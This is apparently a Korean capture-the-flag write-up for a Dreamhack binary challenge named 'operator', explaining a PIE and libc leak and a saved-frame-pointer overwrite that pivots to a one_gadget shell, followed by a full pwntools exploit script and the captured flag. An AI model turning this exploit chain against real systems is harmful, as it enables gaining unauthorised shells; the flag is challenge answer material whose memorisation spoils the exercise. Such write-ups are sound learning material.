보호기법은 풀이다.
bss를 다 채워서 pie leak,
printf 직전으로 돌아가서 rdi에 libc 관련 주소가 들어있어서 libc_base 릭.

그 다음 쉘 따는 거.
filp sfp, filp ret, main ret 변조 다 고려해본 결과 filp sfp를 변조하고 main의 leave ret을 통해 one_gadget 혹은 ROP
filp에서 숫자를 입력받을 때 다른 함수를 써서 0xe 만큼 입력받고 atoll 취한다. 이 때 입력받은 게 stack에 그대로 남아있고, `filp의 sfp` - 0x80에 그 값이 그대로 남아있다. 그래서 sfp를 저기로 옮기고 main의 leave_ret으로 원가젯을 실행시킬 수 있었다.

```bash
0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```
위와 같은 원가젯을 썼고, sfp의 첫 바이트가 0x80 이상이어야 해서 1/2, sfp를 bss의 어느 구역으로 옮겨 \[rbp-0x70\]을 NULL로 만들었는데 이 때 주소를 잘 조작하면 성립하는 pie_base가 하나 존재하고, 이가 1/16 -> 총 1/32 확률로 익스에 성공한다.

# Exploit code

```python
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('host3.dreamhack.games', 18616)
#p = process('./operator')
l = ELF('./libc.so.6')
e = ELF('./operator')

p.sendlineafter(b'>> ', b'1')
p.sendafter(b'>> ', b'a' * 0x1000)
p.sendlineafter(b'>> ', b'1')
p.recvuntil(b'a' * 0x1000)
pie_base = u64(p.recvn(6).ljust(8, b'\x00')) - 0x2008
print(hex(pie_base))
p.sendafter(b'>> ', b'\x00' * 0x1000)

p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'offset: ', str(0x30).encode())
p.sendlineafter(b'(7 ~ 0): ', b'6')
p.recvline()
p.recvline()
l.address = u64(p.recvn(6).ljust(8, b'\x00')) - (0x7ffff7df50d0 - 0x7ffff7d93000)
print(hex(l.address))

print(hex(pie_base + e.bss()))

sleep(1)
p.send(b'2')
p.sendlineafter(b'offset: ', str(0x28).encode())
p.sendlineafter(b'(7 ~ 0): ', b'7\x00' + p64(pie_base + e.bss() + 0x10000)[2:] + p64(l.address + 0xebdb3)[:6])
p.interactive()
```
`DH{1cd38fae64d2dc5e32aed45b150275b9a39b37d28265114ee0e7bd0e024ffdb7}`